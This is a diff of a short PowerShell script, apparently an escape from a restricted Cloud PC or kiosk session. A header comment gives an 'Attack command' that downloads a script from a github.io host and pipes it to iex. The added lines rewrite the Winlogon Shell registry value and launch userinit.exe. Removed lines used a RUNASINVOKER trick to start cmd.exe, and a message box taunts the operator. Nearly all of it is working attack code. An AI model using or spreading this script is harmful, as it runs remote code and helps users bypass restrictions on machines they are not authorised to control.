@@ -3,7 +3,8 @@
 # Attack command: powershell -c iwr https://bfffggh.github.io/bp1|iex<br>
 
 Add-Type -Assembly System.Windows.Forms
+Start-Process reg.exe -Argument 'add "HKCU\Software\Microsoft\Windows NT\CurrentVersion\Winlogon" /v Shell /d explorer.exe /f'
+Start-Process userinit.exe
 [System.Windows.Forms.MessageBox]::Show('thx for the free Cloud PC m8','Nice!')
-Start-Process cmd.exe -Argument '/min /C "set __COMPAT_LAYER=RUNASINVOKER && start "" cmd.exe'
-(New-Object -ComObject "wscript.shell").SendKeys("^{ESC}") 
+# (New-Object -ComObject "wscript.shell").SendKeys("^{ESC}") 
 
